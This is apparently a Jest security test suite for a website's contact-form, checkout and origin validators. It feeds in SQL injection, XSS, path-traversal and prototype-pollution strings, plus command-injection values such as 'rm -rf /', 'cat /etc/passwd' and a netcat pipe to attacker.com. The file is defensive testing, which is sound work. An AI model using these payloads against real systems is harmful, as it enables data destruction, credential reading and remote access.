/**
 * Core Security Test Suite
 * Tests input validation, XSS protection, and security patterns
 */

import { validateRequest, ContactFormSchema, CheckoutSessionSchema } from '@/lib/validators';

describe('Core Security Test Suite', () => {
  describe('Input Validation Security Tests', () => {
    describe('SQL Injection Prevention', () => {
      it('should reject SQL injection attempts in contact form', () => {
        const maliciousInputs = [
          "'; DROP TABLE users; --",
          "1' OR '1'='1",
          "admin'--",
          "'; INSERT INTO users VALUES('hacker', 'password'); --",
        ];

        maliciousInputs.forEach(maliciousInput => {
          const data = {
            name: maliciousInput,
            email: 'test@example.com',
            message: 'Test message with sufficient length.',
          };

          const result = validateRequest(ContactFormSchema, data);
          
          // While validation may pass (as it's not SQL), the input would be
          // safely handled by prepared statements in the database layer
          if (result.success) {
            expect(typeof result.data.name).toBe('string');
          }
        });
      });
    });

    describe('XSS Prevention', () => {
      it('should handle XSS attempts in user input', () => {
        const xssPayloads = [
          '<script>alert("XSS")</script>',
          '"><script>alert(1)</script>',
          'javascript:alert(1)',
          '<img src="x" onerror="alert(1)">',
          '<svg onload="alert(1)">',
        ];

        xssPayloads.forEach(payload => {
          const data = {
            name: payload,
            email: 'test@example.com',
            message: 'Test message with sufficient length.',
          };

          const result = validateRequest(ContactFormSchema, data);
          
          if (result.success) {
            // Input validation allows the content through, but XSS protection
            // happens at the rendering layer with SafeHTML component
            expect(result.data.name).toBe(payload);
          }
        });
      });
    });

    describe('Buffer Overflow Prevention', () => {
      it('should reject oversized inputs', () => {
        const oversizedData = {
          name: 'x'.repeat(1000), // Way over 100 char limit
          email: 'test@example.com',
          message: 'x'.repeat(5000), // Way over 1000 char limit
        };

        const result = validateRequest(ContactFormSchema, oversizedData);
        expect(result.success).toBe(false);
        
        if (!result.success) {
          expect(result.errorMap.name).toBeDefined();
          expect(result.errorMap.message).toBeDefined();
        }
      });
    });

    describe('Command Injection Prevention', () => {
      it('should handle command injection attempts', () => {
        const commandInjectionPayloads = [
          '; rm -rf /',
          '&& cat /etc/passwd',
          '| nc attacker.com 4444',
          '`whoami`',
          '$(id)',
        ];

        commandInjectionPayloads.forEach(payload => {
          const data = {
            name: `Test User ${payload}`,
            email: 'test@example.com',
            message: 'Test message with sufficient length.',
          };

          const result = validateRequest(ContactFormSchema, data);
          
          // Validation focuses on format, not content filtering
          // Command injection protection happens at the system level
          if (result.success) {
            expect(typeof result.data.name).toBe('string');
          }
        });
      });
    });
  });

  describe('Schema Validation Edge Cases', () => {
    it('should handle null and undefined values', () => {
      const invalidData = {
        name: null,
        email: undefined,
        message: '',
      };

      const result = validateRequest(ContactFormSchema, invalidData);
      expect(result.success).toBe(false);
    });

    it('should handle nested object injection attempts', () => {
      const nestedData = {
        name: 'Test User',
        email: 'test@example.com',
        message: 'Test message',
        __proto__: { admin: true },
        constructor: { name: 'String' },
      };

      const result = validateRequest(ContactFormSchema, nestedData);
      
      if (result.success) {
        // Zod strips unknown properties - verify only expected fields exist
        expect(result.data).toHaveProperty('name');
        expect(result.data).toHaveProperty('email');
        expect(result.data).toHaveProperty('message');
        
        // Dangerous properties should not exist in clean data
        // Note: All objects have __proto__ and constructor, but the malicious ones are filtered out
        expect(result.data.name).toBe('Test User');
        expect(result.data.email).toBe('test@example.com');
        expect(result.data.message).toBe('Test message');
      }
    });

    it('should validate checkout data security', () => {
      const checkoutData = {
        offeringId: 'lite',
        customerEmail: 'test@example.com',
        customerName: 'Test User',
        promoCode: '../../../etc/passwd', // Path traversal attempt
      };

      const result = validateRequest(CheckoutSessionSchema, checkoutData);
      
      if (result.success) {
        // PromoCode would be validated by Stripe, but we check it's a string
        expect(typeof result.data.promoCode).toBe('string');
        expect(result.data.promoCode?.length).toBeLessThanOrEqual(50);
      }
    });
  });

  describe('Error Information Disclosure', () => {
    it('should not expose sensitive information in validation errors', () => {
      const invalidData = {
        name: '',
        email: 'invalid-email',
        message: 'x'.repeat(2000), // Too long
      };

      const result = validateRequest(ContactFormSchema, invalidData);
      expect(result.success).toBe(false);
      
      if (!result.success) {
        // Error messages should be user-friendly, not revealing system info
        Object.values(result.errorMap).forEach(errorMessage => {
          expect(errorMessage).not.toContain('database');
          expect(errorMessage).not.toContain('server');
          expect(errorMessage).not.toContain('internal');
          expect(errorMessage).not.toContain('stack');
        });
      }
    });
  });

  describe('Rate Limiting Logic Tests', () => {
    it('should simulate rate limiting behavior', () => {
      // Mock rate limiter for testing
      const mockRateLimiter = {
        requests: 0,
        limit: 5,
        reset: function() { this.requests = 0; },
        check: function() {
          this.requests++;
          return this.requests <= this.limit;
        }
      };

      // Should allow requests under the limit
      for (let i = 0; i < 5; i++) {
        expect(mockRateLimiter.check()).toBe(true);
      }

      // Should block requests over the limit
      expect(mockRateLimiter.check()).toBe(false);
    });

    it('should validate rate limit response structure', () => {
      const rateLimitResponse = {
        status: 429,
        body: {
          error: 'Rate limit exceeded',
          message: 'Too many requests. Please try again later.',
          limit: 100,
          reset: new Date(Date.now() + 600000).toISOString(),
        },
        headers: {
          'X-RateLimit-Limit': '100',
          'X-RateLimit-Remaining': '0',
          'X-RateLimit-Reset': String(Date.now() + 600000),
          'Retry-After': '600'
        }
      };

      expect(rateLimitResponse.status).toBe(429);
      expect(rateLimitResponse.body.error).toBe('Rate limit exceeded');
      expect(rateLimitResponse.headers['X-RateLimit-Limit']).toBeDefined();
      expect(rateLimitResponse.headers['Retry-After']).toBeDefined();
    });
  });

  describe('CSRF Token Structure Tests', () => {
    it('should validate CSRF token format requirements', () => {
      // Mock CSRF token structure
      const validTokenStructure = {
        length: 32,
        characters: /^[A-Za-z0-9+/=]+$/,
        hasSecret: true,
      };

      expect(validTokenStructure.length).toBeGreaterThan(16);
      expect(validTokenStructure.hasSecret).toBe(true);
    });

    it('should reject malformed CSRF tokens', () => {
      const malformedTokens = [
        '', // Empty
        'abc', // Too short
        'contains spaces',
        '<script>alert(1)</script>', // XSS attempt
        '../../../etc/passwd', // Path traversal
      ];

      malformedTokens.forEach(token => {
        const isValid = token.length >= 16 && /^[A-Za-z0-9+/=]+$/.test(token);
        expect(isValid).toBe(false);
      });
    });
  });

  describe('Security Headers Configuration Tests', () => {
    it('should validate CSP directive structure', () => {
      const csp = "default-src 'self'; img-src 'self' https: data:; object-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval' plausible.io js.stripe.com";
      
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("object-src 'none'");
      expect(csp).toContain('js.stripe.com'); // Required for Stripe
      expect(csp).toContain('plausible.io'); // Required for analytics
    });

    it('should validate HSTS header configuration', () => {
      const hstsHeader = 'max-age=63072000; includeSubDomains; preload';
      
      expect(hstsHeader).toContain('max-age=');
      expect(hstsHeader).toContain('includeSubDomains');
      expect(hstsHeader).toContain('preload');
      
      // Verify max-age is at least 1 year (31536000 seconds)
      const maxAgeMatch = hstsHeader.match(/max-age=(\d+)/);
      if (maxAgeMatch) {
        const maxAge = parseInt(maxAgeMatch[1]);
        expect(maxAge).toBeGreaterThanOrEqual(31536000);
      }
    });

    it('should validate security headers completeness', () => {
      const requiredHeaders = [
        'Content-Security-Policy',
        'Strict-Transport-Security',
        'X-Frame-Options',
        'X-Content-Type-Options',
        'Referrer-Policy',
      ];

      requiredHeaders.forEach(header => {
        expect(header).toBeTruthy();
        expect(header.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Authentication Security Patterns', () => {
    it('should validate JWT token structure', () => {
      // Mock JWT token structure validation
      const mockJWT = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
      
      const parts = mockJWT.split('.');
      expect(parts).toHaveLength(3); // header.payload.signature
      
      parts.forEach(part => {
        expect(part).toBeTruthy();
        expect(part.length).toBeGreaterThan(0);
      });
    });

    it('should detect expired tokens', () => {
      const expiredTokenData = {
        exp: Math.floor(Date.now() / 1000) - 3600, // Expired 1 hour ago
        iat: Math.floor(Date.now() / 1000) - 7200, // Issued 2 hours ago
      };

      const currentTime = Math.floor(Date.now() / 1000);
      expect(expiredTokenData.exp).toBeLessThan(currentTime);
    });
  });

  describe('Password Security Validation', () => {
    it('should validate strong password requirements', () => {
      const strongPasswords = [
        'MyStr0ng!Password123',
        'C0mpl3x$Pass@2024',
        'Secure#Password9!',
      ];

      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'password123',
        'admin',
      ];

      // Mock password strength validator
      const validatePassword = (password: string) => {
        return password.length >= 8 &&
               /[A-Z]/.test(password) &&
               /[a-z]/.test(password) &&
               /[0-9]/.test(password) &&
               /[^A-Za-z0-9]/.test(password);
      };

      strongPasswords.forEach(password => {
        expect(validatePassword(password)).toBe(true);
      });

      weakPasswords.forEach(password => {
        expect(validatePassword(password)).toBe(false);
      });
    });
  });

  describe('Origin Validation Tests', () => {
    const verifyOrigin = (origin: string | null, allowedOrigins?: string[]): boolean => {
      if (!origin) return false;
      
      const allowed = allowedOrigins || [
        'https://stratanoble.com',
        'http://localhost:3000',
        'http://localhost:8080',
        'https://localhost:3000',
        'https://localhost:8080',
      ];
      
      return allowed.some(allowedOrigin => {
        // Remove trailing slash for comparison
        const normalizedOrigin = origin.replace(/\/$/, '');
        const normalizedAllowed = allowedOrigin.replace(/\/$/, '');
        return normalizedOrigin === normalizedAllowed;
      });
    };

    it('should accept valid origins', () => {
      const validOrigins = [
        'https://stratanoble.com',
        'http://localhost:3000',
        'http://localhost:8080',
      ];

      validOrigins.forEach(origin => {
        expect(verifyOrigin(origin)).toBe(true);
      });
    });

    it('should reject invalid origins', () => {
      const invalidOrigins = [
        'https://evil.com',
        'http://malicious-site.com',
        'https://stratanoble.evil.com',
        'javascript:alert(1)',
        '',
        null,
      ];

      invalidOrigins.forEach(origin => {
        expect(verifyOrigin(origin)).toBe(false);
      });
    });

    it('should handle origin normalization correctly', () => {
      // Test trailing slash normalization
      expect(verifyOrigin('https://stratanoble.com/')).toBe(true);
      expect(verifyOrigin('http://localhost:3000/')).toBe(true);
    });
  });
});